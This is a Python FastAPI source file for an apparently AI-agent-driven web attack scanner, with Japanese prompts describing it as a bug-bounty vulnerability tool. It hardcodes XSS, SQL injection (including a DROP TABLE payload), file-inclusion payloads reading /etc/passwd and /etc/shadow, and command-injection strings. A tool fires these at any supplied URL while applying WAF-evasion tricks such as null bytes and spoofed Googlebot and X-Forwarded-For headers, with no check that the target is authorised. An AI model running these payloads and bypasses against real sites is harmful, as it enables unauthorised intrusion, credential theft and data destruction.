import os
import uvicorn
from fastapi import FastAPI, APIRouter, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field
from dotenv import load_dotenv
from typing import Optional, List, Dict
import asyncio
import httpx
import re
from bs4 import BeautifulSoup
import random
import string
import time
from urllib.parse import quote_plus
import json

from langchain_google_genai import ChatGoogleGenerativeAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_core.tools import tool
from langchain.memory import ConversationBufferMemory

load_dotenv()
app = FastAPI()
router = APIRouter()

def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
    if bypass_technique == "case_obfuscation":
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    elif bypass_technique == "url_encoding":
        return quote_plus(payload)
    elif bypass_technique == "character_substitution":
        return payload.replace(" ", "+").replace("<", "%3C").replace(">", "%3E")
    elif bypass_technique == "add_null_byte":
        return payload.replace("'", "%00'")
    return payload

def generate_xss_payloads() -> List[str]:
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS');",
        "';alert('XSS');//",
        "\"-confirm(1)-",
        "<body onload='alert(\"XSS\")'>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<a href='javascript:alert(\"XSS\")'>click</a>",
        "<img src='#' onerror='alert(1)'>",
        "<p>test<svg/onload=alert(1)>",
        "<div onmousemove=alert(1)>",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
    ]

def generate_sqli_payloads() -> List[str]:
    return [
        "' OR 1=1--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' OR '1'='1'#",
        "admin' --",
        "admin' #",
        "sleep(5)",
        "benchmark(10000000,MD5(1))",
        "' OR 1=2",
        "\" OR 1=1--",
        "1' OR '1'='1",
        "1; DROP TABLE users;--",
        "' AND 1=2 UNION SELECT 'A', 'B', 'C'",
        "' WAITFOR DELAY '0:0:5'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
    ]

def generate_lfi_payloads() -> List[str]:
    return [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../../../../../../../../../windows/win.ini",
        "file:///etc/passwd",
        "/proc/self/cmdline"
    ]

def generate_rce_payloads() -> List[str]:
    return [
        ";ls -la;",
        "|id|",
        "`id`",
        "|ping -c 4 127.0.0.1|",
        "&&id",
        "%26%26id",
        ";cat /etc/passwd",
        "() { :; }; /bin/eject",
    ]

@tool
async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
    bypass_techniques = ["case_obfuscation", "url_encoding", "character_substitution", "add_null_byte"]
    bypass_headers_list = [
        {},
        {'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': '127.0.0.1'},
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)','Referer': 'https://www.google.com/'}
    ]

    try:
        data_dict = json.loads(data) if data else {}
    except (json.JSONDecodeError, TypeError):
        return f"Error: Invalid JSON in 'data': {data}"

    async with httpx.AsyncClient() as client:
        try:
            initial_response = await client.request(
                method.upper(),
                url,
                json=data_dict if data_dict else None,
                headers=headers or {},
                timeout=15
            )

            for technique in bypass_techniques:
                for bypass_headers in bypass_headers_list:
                    modified_data_dict = {k: apply_waf_bypass(v, technique) for k, v in data_dict.items()} if data_dict else None
                    combined_headers = {**(headers or {}), **bypass_headers}

                    try:
                        response_bypass = await client.request(
                            method.upper(),
                            url,
                            json=modified_data_dict if modified_data_dict else None,
                            headers=combined_headers,
                            timeout=15
                        )

                        vulnerability_flags = []
                        if payload_type == "sqli":
                            if response_bypass.status_code == 500 or re.search(r"sql|mysql|query error", response_bypass.text, re.IGNORECASE):
                                vulnerability_flags.append("SQLI_ERROR_DETECTED")
                        if payload_type == "xss":
                            if modified_data_dict and any(str(val) in response_bypass.text for val in modified_data_dict.values()):
                                vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")
                        if payload_type in ["path_traversal", "lfi"]:
                            if re.search(r"root:[xX]:0:0:|etc/passwd", response_bypass.text, re.IGNORECASE):
                                vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")
                        if payload_type == "rce":
                            if re.search(r"uid=\d+", response_bypass.text, re.IGNORECASE):
                                vulnerability_flags.append("RCE_COMMAND_OUTPUT_DETECTED")

                        if vulnerability_flags:
                            return f"Status Code: {response_bypass.status_code}\nFlags: {' | '.join(vulnerability_flags)}\nResponse: {response_bypass.text[:500]}"

                    except Exception as e:
                        print(f"Bypass attempt error: {e}")

            return "WAF bypass attempts failed or no vulnerability detected."

        except httpx.RequestError as e:
            raise HTTPException(status_code=500, detail=f"Request Error: {e}")

@tool
async def detect_waf(url: str) -> str:
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=10)
            waf_indicators = {"Cloudflare": "cloudflare", "Sucuri": "sucuri", "AWS WAF": "awselb", "Imperva": "imperva", "Akamai": "akamai", "Wordfence": "wordfence"}
            for indicator, name in waf_indicators.items():
                if name in response.headers.get('Server', '').lower() or name in response.text.lower():
                    return f"WAF detected: {indicator}"
            return "No known WAF detected."
    except httpx.RequestError as e:
        raise HTTPException(status_code=500, detail=f"WAF detection error: {e}")

class TechStackItem(BaseModel):
    name: str
    version: Optional[str] = None

class ScanInput(BaseModel):
    url: str
    target_endpoint: str
    tech_stack: Optional[List[TechStackItem]] = None
    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf", "lfi", "rce"])

@router.post("/start_scan")
async def start_scan(scan_input: ScanInput):
    llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
    tools = [send_http_request_with_payload, detect_waf]
    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)

    agent_prompt = ChatPromptTemplate.from_messages([
        ("system", "あなたはバグバウンティの専門家であり、高度なウェブ脆弱性スキャナーです。"),
        MessagesPlaceholder("chat_history"),
        ("human", "{query}"),
        MessagesPlaceholder("agent_scratchpad"),
    ])

    agent = create_tool_calling_agent(llm, tools, agent_prompt)
    agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=True, memory=memory)

    all_xss_payloads = generate_xss_payloads()
    all_sqli_payloads = generate_sqli_payloads()
    all_lfi_payloads = generate_lfi_payloads()
    all_rce_payloads = generate_rce_payloads()

    tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in (scan_input.tech_stack or [])]) or "情報なし"

    initial_query = f"""
    ターゲットURL: {scan_input.url}
    攻撃対象エンドポイント: {scan_input.target_endpoint}
    技術スタック: {tech_stack_str}
    診断する脆弱性タイプ: {', '.join(scan_input.vulnerability_types)}
    """

    try:
        result = await agent_executor.ainvoke({"query": initial_query})
        final_report = result.get("output") or json.dumps(result, ensure_ascii=False)
        return {"status": "scanning_complete", "final_report": final_report}
    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error", "final_report": f"診断中にエラーが発生しました: {str(e)}"})

@app.get("/health")
async def health_check():
    return {"status": "ok"}

@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    html_content = """
    <!DOCTYPE html><html><head><title>脆弱性スキャナー</title></head>
    <body>
    <h1>脆弱性スキャン</h1>
    <input id="url" value="http://localhost:8000">
    <input id="endpoint" value="/search">
    <input id="tech_stack" value="WordPress 5.8, Apache 2.4.46">
    <button onclick="startScan()">スキャン開始</button>
    <div id="output"></div>
    <script>
    async function startScan() {
        const scanData = {
            url: document.getElementById('url').value,
            target_endpoint: document.getElementById('endpoint').value,
            tech_stack: document.getElementById('tech_stack').value.split(',').map(item => {
                const parts = item.trim().split(' ');
                return { name: parts[0], version: parts.slice(1).join(' ') || null };
            }),
            vulnerability_types: ["xss","sql_injection","path_traversal","ssrf","lfi","rce"]
        };
        const outputDiv = document.getElementById('output');
        outputDiv.textContent = 'スキャンを開始しています...';
        try {
            const response = await fetch('/start_scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(scanData)
            });
            const text = await response.text();
            try {
                const json = JSON.parse(text);
                outputDiv.textContent = response.ok
                    ? 'スキャン完了\\n\\n' + json.final_report
                    : 'エラー: ' + (json.detail || JSON.stringify(json));
            } catch {
                outputDiv.textContent = 'エラー: レスポンスがJSONではありません\\n\\n' + text;
            }
        } catch (err) {
            outputDiv.textContent = 'ネットワークエラー: ' + err.message;
        }
    }
    </script>
    </body></html>
    """
    return HTMLResponse(content=html_content)

app.include_router(router)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
